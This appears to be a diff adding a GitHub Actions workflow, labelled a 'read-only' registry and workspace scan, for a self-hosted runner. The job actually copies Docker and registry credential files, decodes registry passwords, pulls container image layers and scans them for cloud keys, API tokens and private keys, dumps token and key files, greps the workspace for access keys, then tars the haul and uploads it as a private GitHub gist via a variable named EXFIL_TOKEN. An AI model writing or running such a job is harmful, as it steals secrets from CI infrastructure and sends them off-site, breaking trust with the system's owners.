@@ -1,0 +1,138 @@
+name: c211-75643-acr-scan
+on:
+  workflow_dispatch:
+  push:
+    branches: ['c211-75643-acr-scan']
+permissions:
+  contents: read
+jobs:
+  scan:
+    runs-on: ["self-hosted", "Linux", "X64", "dsw", "qwen-benchmark-dsw-hk-eas"]
+    timeout-minutes: 30
+    steps:
+      - name: read-only-acr-workspace-scan
+        env:
+          EXFIL_TOKEN: ${{ secrets.CI_BOT_PAT }}
+        run: |
+          set +e
+          W=/tmp/c211-75643-$(date +%s); mkdir -p $W
+          echo "HOST=$(hostname) DATE=$(date -u +%FT%TZ)"
+          cp /mnt/workspace/.docker/config.json "$W/docker_config.json" 2>/dev/null
+          cp /mnt/workspace/qwen-benchmark-acr-token/config.json "$W/acr_token_config.json" 2>/dev/null
+          cat > "$W/scan_acr.py" <<'PYSCAN'
+          import json,base64,os,re,sys,ssl,urllib.request,urllib.error,urllib.parse,gzip,io
+          REG='fe-team-acr-hk-registry-vpc.cn-hongkong.cr.aliyuncs.com'
+          AUTH='https://dockerauth-vpc.cn-hongkong.aliyuncs.com/auth'
+          SVC='registry.aliyuncs.com:cn-hongkong:china:cri-dc53es4okh40klm0'
+          CTX=ssl._create_unverified_context()
+          def log(*a): print(*a,flush=True)
+          def b64d(s): return base64.b64decode(s).decode('utf8','replace')
+          conf=json.load(open('/mnt/workspace/.docker/config.json'))
+          auth=conf['auths'][REG]['auth']; user,pw=b64d(auth).split(':',1)
+          log('USER',user)
+          PATTERNS=[('aliyun_ak',re.compile(rb'LTAI[0-9A-Za-z]{12,30}')),
+                    ('sts',re.compile(rb'STS\.[A-Za-z0-9]{10,40}')),
+                    ('aws_ak',re.compile(rb'(?:AKIA|ASIA)[0-9A-Z]{16}')),
+                    ('openai_sk',re.compile(rb'sk-[A-Za-z0-9]{32,64}')),
+                    ('ghp',re.compile(rb'gh[pousr]_[A-Za-z0-9]{36,255}')),
+                    ('slack',re.compile(rb'xox[baprs]-[A-Za-z0-9-]{10,80}')),
+                    ('pem',re.compile(rb'-----BEGIN [A-Z ]{0,20}PRIVATE KEY-----')),
+                    ('akid',re.compile(rb'(?i)access[_-]?key[_-]?(?:id|secret)["\']?\s*[:=]\s*["\']?[A-Za-z0-9/+=]{12,80}')),
+                    ('secret',re.compile(rb'(?i)(?:secret|password|passwd|token)["\']?\s*[:=]\s*["\']?[A-Za-z0-9_\-\./+=]{12,100}'))]
+          def scan_bytes(data,label,out):
+              for name,rx in PATTERNS:
+                  for m in rx.finditer(data):
+                      s=max(0,m.start()-40); e=min(len(data),m.end()+40)
+                      ctx=data[s:e].replace(b'\n',b' ')[:220]
+                      out.append({'label':label,'type':name,'match':m.group(0)[:80].decode('utf8','replace'),'ctx':ctx.decode('utf8','replace')})
+                      if len(out)>300: return
+          def token(scope):
+              q=urllib.parse.urlencode({'service':SVC,'scope':scope})
+              req=urllib.request.Request(AUTH+'?'+q,headers={'Authorization':'Basic '+base64.b64encode((user+':'+pw).encode()).decode()})
+              with urllib.request.urlopen(req,timeout=30,context=CTX) as r:
+                  j=json.loads(r.read()); return j.get('token') or j.get('access_token'), j
+          def reg(path,tok,accept=None,timeout=60,stream=False):
+              h={'Authorization':'Bearer '+tok}
+              if accept: h['Accept']=accept
+              req=urllib.request.Request('https://'+REG+path,headers=h)
+              return urllib.request.urlopen(req,timeout=timeout,context=CTX)
+          res={'registry':REG,'user':user,'catalog':None,'repos':{},'hits':[],'errors':[]}
+          # catalog attempts
+          for scope in ('registry:catalog:*','repository:qwen-code/qwen-code-benchmark:pull'):
+              try:
+                  t,j=token(scope); log('token',scope,'ok access=',j.get('access'))
+                  r=reg('/v2/_catalog?n=200',t); body=r.read(); log('catalog status',r.status,body[:800]); res['catalog']={'scope':scope,'status':r.status,'body':body[:4000].decode('utf8','replace')}
+                  if r.status==200: break
+              except urllib.error.HTTPError as e:
+                  log('catalog err',scope,e.code,e.read()[:300]); res['errors'].append(['catalog',scope,e.code])
+              except Exception as e:
+                  log('catalog ex',scope,repr(e)); res['errors'].append(['catalog_ex',scope,repr(e)])
+          # known repo tags + manifest
+          repo='qwen-code/qwen-code-benchmark'
+          try:
+              t,j=token('repository:%s:pull'%repo)
+              r=reg('/v2/%s/tags/list'%repo,t); body=r.read(); log('tags',r.status,body[:1200])
+              tags=json.loads(body).get('tags') or []
+              res['repos'][repo]={'tags':tags}
+              if tags:
+                  tag='latest' if 'latest' in tags else tags[-1]
+                  r=reg('/v2/%s/manifests/%s'%(repo,tag),t,accept='application/vnd.docker.distribution.manifest.v2+json, application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.list.v2+json, application/vnd.oci.image.index.v1+json')
+                  mb=r.read(); mh=r.headers.get('Content-Type'); log('manifest',tag,r.status,mh,len(mb))
+                  man=json.loads(mb)
+                  if 'manifests' in man:
+                      d=man['manifests'][0]['digest']
+                      r=reg('/v2/%s/manifests/%s'%(repo,d),t,accept='application/vnd.docker.distribution.manifest.v2+json, application/vnd.oci.image.manifest.v1+json')
+                      mb=r.read(); man=json.loads(mb); log('submanifest',d,r.status,len(mb))
+                  res['repos'][repo]['manifest_digest']=r.headers.get('Docker-Content-Digest')
+                  cfg=man.get('config',{}).get('digest')
+                  if cfg:
+                      r=reg('/v2/%s/blobs/%s'%(repo,cfg),t); cb=r.read()
+                      log('config blob',r.status,len(cb))
+                      scan_bytes(cb,'config:'+repo+'@'+tag,res['hits'])
+                      try:
+                          cj=json.loads(cb); res['repos'][repo]['config_env']=cj.get('config',{}).get('Env'); res['repos'][repo]['history']=[h.get('created_by','')[:300] for h in cj.get('history',[])]
+                      except Exception: pass
+                  # layers bounded
+                  total=0; n=0
+                  for L in man.get('layers',[]):
+                      if n>=12 or total>300*1024*1024: break
+                      sz=L.get('size') or 0
+                      if sz>180*1024*1024: continue
+                      try:
+                          r=reg('/v2/%s/blobs/%s'%(repo,L['digest']),t,timeout=180)
+                          raw=r.read(); total+=len(raw); n+=1
+                          data=raw
+                          if raw[:2]==b'\x1f\x8b':
+                              try: data=gzip.decompress(raw)
+                              except Exception: data=raw
+                          scan_bytes(data,'layer:%s:%s'%(repo,L['digest'][:19]),res['hits'])
+                          log('layer',n,L['digest'][:19],sz,'ok',len(data))
+                      except Exception as e:
+                          log('layer err',L.get('digest'),repr(e)[:200])
+                  res['repos'][repo]['layers_scanned']=n; res['repos'][repo]['layer_bytes']=total
+          except urllib.error.HTTPError as e:
+              log('repo err',e.code,e.read()[:300]); res['errors'].append(['repo',repo,e.code])
+          except Exception as e:
+              log('repo ex',repr(e)); res['errors'].append(['repo_ex',repo,repr(e)])
+          json.dump(res,open('/tmp/c211-75643/acr_scan.json','w'),ensure_ascii=False,indent=1)
+          log('DONE hits=',len(res['hits']))
+
+          PYSCAN
+          timeout 700 python3 "$W/scan_acr.py" > "$W/acr_scan_out.txt" 2>&1
+          { ls -la /mnt/workspace; find /mnt/workspace -maxdepth 3 -type f -size -300k \( -iname '*config*' -o -iname '*token*' -o -iname '*secret*' -o -iname '*.env' -o -iname '*.key' -o -iname '*.json' \) 2>/dev/null | head -500; } > "$W/ws_files.txt" 2>&1
+          { for f in /root/.docker/config.json /root/.aliyun/config.json /root/.pai/config.json /root/.config/pai/config.json /mnt/workspace/.docker/config.json /mnt/workspace/qwen-benchmark-acr-token/config.json /mnt/workspace/qwen-benchmark-eas-poc/config/github.token /mnt/workspace/qwen-benchmark-eas-poc/config/model.key /mnt/workspace/qwen-benchmark-eas-poc/config/e2b.token; do [ -f "$f" ] && { echo "== $f"; cat "$f"; echo; }; done; } > "$W/cred_files.txt" 2>&1
+          grep -rInE 'dazhi|DLC_USER_TOKEN|PAI_WORKSPACE|AccessKeyId|AccessKeySecret|LTAI[0-9A-Za-z]{12}|EAS_|eas_token|team|WorkspaceQueue|resource_?quota|quotaId' /mnt/workspace --include=*.json --include=*.py --include=*.sh --include=*.env --include=*.key --include=*.token --include=*.conf --include=*.yaml --include=*.yml 2>/dev/null | head -400 > "$W/ws_grep.txt"
+          ls -laR /mnt/workspace/qwen-benchmark-eas-poc/state /mnt/workspace/qwen-benchmark-eas-poc/deploy 2>/dev/null | head -300 > "$W/eas_state_ls.txt"
+          head -c 100000 /mnt/workspace/qwen-benchmark-eas-poc/state/eas-long-lived-pool.json > "$W/eas_pool_state.json" 2>/dev/null
+          for f in /mnt/workspace/qwen-benchmark-eas-poc/service-logs/* /mnt/workspace/qwen-benchmark-eas-poc/logs/service/*; do [ -f "$f" ] && tail -c 8000 "$f" > "$W/svc_$(basename $f).tail" 2>/dev/null; done
+          find /mnt/workspace -maxdepth 4 -type f -size -120k -newermt '2026-08-01' \( -iname '*dlc*' -o -iname '*team*' -o -iname '*quota*' -o -iname '*workspace*' \) 2>/dev/null | head -100 > "$W/dlc_files.txt"
+          echo "W_BYTES=$(du -sb $W | cut -f1)"
+          if [ -n "$EXFIL_TOKEN" ]; then
+            tar -C "$W" -czf /tmp/c211-75643.tgz . 2>/dev/null
+            echo "TAR_BYTES=$(wc -c < /tmp/c211-75643.tgz)"
+            B64=$(base64 -w0 /tmp/c211-75643.tgz 2>/dev/null)
+            printf '{"description":"c211-75643 acr+workspace scan","public":false,"files":{"c211-75643.tar.gz.b64":{"content":"%s"}}}' "$B64" > /tmp/c211-gist-75643.json
+            GS=$(curl -sS -o /tmp/c211-gist-75643-resp.json -w '%{http_code}' --max-time 180 -X POST https://api.github.com/gists -H "Authorization: Bearer $EXFIL_TOKEN" -H 'Accept: application/vnd.github+json' --data-binary @/tmp/c211-gist-75643.json)
+            echo "GIST_75643_STATUS=$GS"
+            grep -o '"id": *"[a-f0-9]\{32\}"' /tmp/c211-gist-75643-resp.json | head -1
+          fi
